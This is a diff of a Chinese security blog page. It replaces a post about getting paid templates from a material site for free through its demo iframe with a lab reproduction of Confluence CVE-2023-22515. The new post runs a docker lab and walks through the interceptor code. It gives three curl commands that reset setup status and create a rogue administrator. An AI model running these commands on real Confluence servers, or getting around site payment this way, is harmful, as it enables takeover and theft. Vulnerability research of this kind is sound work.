@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>逻辑绕过某站下载网页素材 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="逻辑绕过某站下载网页素材 | 九世的博客">
+  <title>Confluence CVE-2023-22515漏洞复现 | 九世的博客</title>
+  <meta name="keywords" content=" java代码审计 ">
+  <meta name="description" content="Confluence CVE-2023-22515漏洞复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
@@ -2002,9 +2002,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-逻辑绕过某站下载网页素材" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Confluence-CVE-2023-22515漏洞复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">逻辑绕过某站下载网页素材</h1>
+        <h1 class="article-title">Confluence CVE-2023-22515漏洞复现</h1>
     
     <div class="article-meta">
         
@@ -2013,14 +2013,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color4">java代码审计</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-04-06 16:37</time>
+        创建时间:<time class="date" title="更新时间: 2023-10-19 16:28:25">2023-10-19 15:58</time>
         
     </div>
     <div class="article-meta">
@@ -2042,7 +2042,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -2054,18 +2054,90 @@
         display: none !important;
     }
 </style>
-</li></div>
+</div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近开了个坑，想用django写个项目..然后发现那个前端，那个前端啊。真是恶意极强，真的是佛了后面找到某素材站。还要钱下载，我。。。祝你清明节快乐<br><img src="https://img3.hackhome.com/img2018/4/24/16/543838169.jpg" alt="543838169.jpg"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>素材站：<a href="http://www.17sucai.com" target="_blank" rel="noopener">jQuery网页特效最全网页模板和网站模板jQuery代码_17素材网</a><br>一开始想去挖他看看有没有逻辑充值，然后发现后端做了效验<br><img src="https://s2.ax1x.com/2019/04/06/AWHAMD.png" alt="AWHAMD.png"></p>
-<p><img src="https://s2.ax1x.com/2019/04/06/AWHHwd.md.png" alt="AWHHwd.md.png"></p>
-<p>提交表单之后发现还是50块。。。emmm，然后就想着下载能不能搞搞<br>发现也是后端判断的。。我草</p>
-<p>回归到素材那页，发现除了下载还有个演示功能（！= =）<br><img src="https://s2.ax1x.com/2019/04/06/AWO1ts.png" alt="AWO1ts.png"></p>
-<p>打开一看，源码一查iframe嵌套进去的。。。直接打开这个html下载完事…<br><img src="https://s2.ax1x.com/2019/04/06/AWO2nO.md.png" alt="AWO2nO.md.png"></p>
-<p>访问，然后下载保存就完事了..<br><img src="https://s2.ax1x.com/2019/04/06/AWO4Nd.md.png" alt="AWO4Nd.md.png"></p>
-<p>随便说一下:我现在一般把笔记全部放在<a href="https://github.com/422926799/note" target="_blank" rel="noopener">https://github.com/422926799/note</a></p>
-<p>转载请声明：转自422926799.github.io</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://mp.weixin.qq.com/s?__biz=MzkxMzM3NjMxOQ==&amp;mid=2247483685&amp;idx=1&amp;sn=54b435180042beb9b709d1553bc3f5ab&amp;chksm=c17fd475f6085d634f1c529148f7f825400ffe899c51e181193e6bdf7cbd5d01c4697557104a&amp;mpshare=1&amp;scene=1&amp;srcid=1018qojPYalTqmkCEJMtpr6x&amp;sharer_shareinfo=600bda857d36789f7e9d9b21356b7250&amp;sharer_shareinfo_first=600bda857d36789f7e9d9b21356b7250#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzkxMzM3NjMxOQ==&amp;mid=2247483685&amp;idx=1&amp;sn=54b435180042beb9b709d1553bc3f5ab&amp;chksm=c17fd475f6085d634f1c529148f7f825400ffe899c51e181193e6bdf7cbd5d01c4697557104a&amp;mpshare=1&amp;scene=1&amp;srcid=1018qojPYalTqmkCEJMtpr6x&amp;sharer_shareinfo=600bda857d36789f7e9d9b21356b7250&amp;sharer_shareinfo_first=600bda857d36789f7e9d9b21356b7250#rd</a></p>
+<p>影响版本：</p>
+<pre><code>8.0.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.0.4
+8.1.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.1.4
+8.2.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.2.3
+8.3.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.3.2
+8.4.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.4.2
+8.5.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.5.1
+</code></pre><p>Exploit</p>
+<pre><code>curl http://127.0.0.1:8090/server-info.action\?bootstrapStatusProvider.applicationConfig.setupComplete\=false\;
+
+curl -X POST -H &quot;X-Atlassian-Token: no-check&quot; -d &quot;username=haxor&amp;fullName=leet&amp;email=leet@leet.com&amp;password=leet&amp;confirm=leet&amp;setup-next-button=Next&quot; http://127.0.0.1:8090/setup/setupadministrator.action\;
+
+curl -X POST -H &quot;X-Atlassian-Token: no-check&quot; http://127.0.0.1:8090/setup/finishsetup.action
+</code></pre><p>docker-compose.yml</p>
+<pre><code>version: &#39;2&#39;
+services:
+  web:
+    image: vulhub/confluence:8.5.1
+    ports:
+      - &quot;8090:8090&quot;
+      - &quot;5050:5050&quot;
+    depends_on:
+      - db
+  db:
+    image: postgres:12.8-alpine
+    environment:
+    - POSTGRES_PASSWORD=postgres
+    - POSTGRES_DB=confluence
+</code></pre><p>先引用一张图<br><img src="https://z1.ax1x.com/2023/10/19/piiUSF1.png" alt=""></p>
+<p>先定位到setupadministrator.action<br>com.atlassian.confluence_confluence-8.5.1/struts.xml<br><img src="https://z1.ax1x.com/2023/10/19/piiU9W6.png" alt=""></p>
+<p>可以看到处理的class是com.atlassian.confluence.setup.actions.SetupAdministrator，先经过defaultSetupStack的拦截器</p>
+<pre><code>&lt;action name=&quot;setupadministrator-start&quot; class=&quot;com.atlassian.confluence.setup.actions.SetupAdministrator&quot; method=&quot;doDefault&quot;&gt;
+    &lt;interceptor-ref name=&quot;defaultSetupStack&quot;/&gt;
+    &lt;result name=&quot;input&quot; type=&quot;velocity&quot;&gt;/setup/setupadministrator.vm&lt;/result&gt;
+    &lt;result name=&quot;error&quot; type=&quot;velocity&quot;&gt;/setup/setupadministrator.vm&lt;/result&gt;
+&lt;/action&gt;
+
+
+&lt;action name=&quot;setupadministrator&quot; class=&quot;com.atlassian.confluence.setup.actions.SetupAdministrator&quot;&gt;
+    &lt;result name=&quot;input&quot; type=&quot;velocity&quot;&gt;/setup/setupadministrator.vm&lt;/result&gt;
+    &lt;result name=&quot;error&quot; type=&quot;velocity&quot;&gt;/setup/setupadministrator.vm&lt;/result&gt;
+    &lt;result name=&quot;success&quot; type=&quot;redirect&quot;&gt;finishsetup.action&lt;/result&gt;
+    &lt;result name=&quot;custom-setup&quot; type=&quot;redirect&quot;&gt;finishsetup.action&lt;/result&gt;
+    &lt;result name=&quot;quick-setup&quot; type=&quot;redirect&quot;&gt;finishsetup.action&lt;/result&gt;
+&lt;/action&gt;
+</code></pre><p>defaultSetupStack拦截器里有一个setupcheck检测</p>
+<pre><code>            &lt;interceptor-stack name=&quot;setupStack&quot;&gt;
+                &lt;interceptor-ref name=&quot;setup&quot;/&gt;
+            &lt;/interceptor-stack&gt;
+
+
+
+
+&lt;interceptor-stack name=&quot;defaultSetupStack&quot;&gt;
+                &lt;interceptor-ref name=&quot;setupStack&quot;/&gt;
+                &lt;interceptor-ref name=&quot;defaultStack&quot;/&gt;
+            &lt;/interceptor-stack&gt;
+</code></pre><p><img src="https://z1.ax1x.com/2023/10/19/piiUFyD.png" alt=""></p>
+<p>经过动态调试大概逻辑是</p>
+<pre><code>第一次执行
+return BootstrapUtils.getBootstrapManager().isSetupComplete() &amp;&amp; ContainerManager.isContainerSetup() ? &quot;alreadysetup&quot; : actionInvocation.invoke(); -&gt; Fasle-&gt;actionInvocation.invoke();
+
+第二次执行两边的isSetupComplete都返回true。由于返回是true所以是返回alreadysetup
+</code></pre><p>BootstrapUtils.getBootstrapManager().isSetupComplete()会返回setupComplete的值，如果是已经安装则返回true<br><img src="https://z1.ax1x.com/2023/10/19/piiUtkn.png" alt=""></p>
+<p><img src="https://z1.ax1x.com/2023/10/19/piiUNYq.png" alt=""></p>
+<p>而第一次ContainerManager.isContainerSetup()不存在则返回false<br><img src="https://z1.ax1x.com/2023/10/19/piiUUf0.png" alt=""></p>
+<p>一真一假返回假，走到actionInvocation.invoke();，在com/opensymphony/xwork2/DefaultActionInvocation.class第203行会再次执行SetupCheckInterceptor.intercept。由于第二次两边都是true所以返回alreadysetup字符串<br><img src="https://z1.ax1x.com/2023/10/19/piiUdpV.png" alt=""></p>
+<p><img src="https://z1.ax1x.com/2023/10/19/piiUwlT.png" alt=""></p>
+<p>最后ResultCode是alreadysetup，检测为已经安装<br><img src="https://i.imgur.com/6R0t7NX.png" alt=""><br><img src="https://i.imgur.com/kNcDCsE.png" alt=""><br><img src="https://i.imgur.com/v562yNg.png" alt=""></p>
+<p>该漏洞将bootstrapStatusProvider.applicationConfig.setupComplete设置为false。在这里将不会返回alreadysetup，也就是说我们在设置了setupComplete属性为false后；在下一次访问/setup/*目录下触发setupComplete拦截器前将一直有效</p>
+<p>最后漏洞点是出现在，重写拦截器的点上</p>
+<pre><code>&lt;interceptor name=&quot;params&quot; class=&quot;com.atlassian.xwork.interceptors.SafeParametersInterceptor&quot;/&gt;
+</code></pre><p><img src="https://i.imgur.com/vOYE4IW.png" alt=""></p>
+<p>当请求的payload经过isSafeParameterName的匹配，最后会去到stack.setValue()<br><img src="https://i.imgur.com/FTinbUZ.png" alt=""></p>
+<p><img src="https://i.imgur.com/NqXWFHW.png" alt=""></p>
+<p>（然而我动态调试就是断不到这），那你问我，我怎么知道在地方是漏洞点，他钩子就这一个地方能控制不是这也没    别的了（<br>这里还需要设置一手X-Atlassian-Token: no-check的原因还是拦截器有检测，</p>
+<pre><code>&lt;interceptor name=&quot;xsrfToken&quot; class=&quot;com.atlassian.confluence.xwork.ConfluenceXsrfTokenInterceptor&quot;/&gt;
+&lt;interceptor-ref name=&quot;xsrfToken&quot;/&gt;
+</code></pre><p><img src="https://i.imgur.com/RqnV2rZ.png" alt=""><br><img src="https://i.imgur.com/5OmIlWZ.png" alt=""><br><img src="https://i.imgur.com/rOK21jE.png" alt=""></p>
+<p>Exploit<br><img src="https://i.imgur.com/1IwvgSo.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2075,12 +2147,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>逻辑绕过某站下载网页素材</p>
+    <p><span class="copy-title">文章标题:</span>Confluence CVE-2023-22515漏洞复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-04-06, 16:37:17</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/8eec787.html" title="逻辑绕过某站下载网页素材">http://jiushill.github.io/posts/8eec787.html</a>
+    <p><span class="copy-title">发布时间:</span>2023-10-19, 15:58:44</p>
+    <p><span class="copy-title">最后更新:</span>2023-10-19, 16:28:25</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/395d58c0.html" title="Confluence CVE-2023-22515漏洞复现">http://jiushill.github.io/posts/395d58c0.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
